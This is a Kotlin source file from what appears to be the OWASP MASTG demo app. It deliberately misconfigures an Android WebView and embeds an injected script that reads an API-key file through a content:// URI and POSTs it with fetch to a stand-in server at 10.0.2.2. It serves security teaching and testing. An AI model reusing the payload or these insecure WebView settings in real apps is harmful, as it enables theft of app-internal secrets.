package org.owasp.mastestapp

import android.content.Context
import android.webkit.WebView
import java.io.*

/**
 * This class writes a sensitive file ("api-key.txt") into internal storage and then loads a vulnerable
 * page into a WebView. That page simulates an XSS injection:
 * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to
 * read the sensitive file via the content provider and then uses `fetch` to send the content to an external server.
 *
 * By loading the page with a `file://` base URL and enabling universal access from file URLs,
 * we relax the default restriction (which would otherwise treat `content://` requests as opaque origin)
 * and allow the `XMLHttpRequest` to succeed.
 */
class MastgTestWebView(private val context: Context) {

    fun mastgTest(webView: WebView) {
        // Write a sensitive file (for example, cached credentials or private data).
        val sensitiveFile = File(context.filesDir, "api-key.txt")
        sensitiveFile.writeText("MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b")

        // Configure the WebView.
        webView.settings.apply {
            /* `javaScriptEnabled` is required for the attacker's script to even execute.
             * This is very common in WebViews, unless they only load static content.
            */
            javaScriptEnabled = true

            /* `allowUniversalAccessFromFileURLs` is required in this attack since it
             * relaxes the default restrictions so that pages loaded from file:// can access
             * content from any origin (including content:// URIs).
             *
             * If this is not set, the following error will be logged in logcat:
             *
             *   [INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'
             *   from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported
             *   for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
             *
             * Note that the fetch to the external server will still work, but the retrieval of the file content via content:// will fail.
            */
            allowUniversalAccessFromFileURLs = true


            /* `allowContentAccess` is intentionally not set to false to showcase the default behavior.
             * If we were to disable content provider access,
             * this would prevent the attacker's script from accessing the sensitive file via the content provider.
             */
            // allowContentAccess = false

        }

        // Vulnerable HTML simulating an XSS injection.
        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the content provider.
        val vulnerableHtml = """
            <html>
              <head>
                <meta charset="utf-8">
                <title>MASTG-DEMO-0029</title>
              </head>
              <body>
                <h1>MASTG-DEMO-0029</h1>
                <p>This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using content:// URIs.</p>
                <p>The file is located in /data/data/org.owasp.mastestapp/files/</p>
                <p>NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.</p>
                <script type="text/javascript">
                  function exfiltrate(data) {
                    
                    var output = document.createElement("div");
                    output.style.color = "white";
                    output.style.borderRadius = "5px";
                    output.style.backgroundColor = "red";
                    output.style.padding = "1em";
                    output.style.marginTop = "1em";
                    output.innerHTML = "<strong>Exfiltrated Data:</strong><br>" + data;
                    document.body.appendChild(output);
                            
                    // Send the text file content to the external server
                    fetch('http://10.0.2.2:5001/receive', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'text/plain'
                        },
                        body: data
                    })
                    .then(response => console.log('File content sent successfully.'))
                    .catch(err => console.error('Error sending file content:', err));
                  }
                  function readSensitiveFile() {
                    var xhr = new XMLHttpRequest();
                    xhr.onreadystatechange = function() {
                      if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                          exfiltrate(xhr.responseText);
                        } else {
                          exfiltrate("Error reading file: " + xhr.status);
                        }
                      }
                    };
                    // The injected script accesses the sensitive file via the content provider.
                    xhr.open("GET", "content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt", true);
                    xhr.send();
                  }
                  // Simulate the injected payload triggering.
                  readSensitiveFile();
                </script>
              </body>
            </html>
        """.trimIndent()


        // Load the vulnerable HTML.
        // Using a base URL with the file:// scheme gives the page a non‑opaque origin (using content:/// works the same way).
        webView.loadDataWithBaseURL(
            "file:///",
            vulnerableHtml,
            "text/html",
            "UTF-8",
            null
        )
    }
}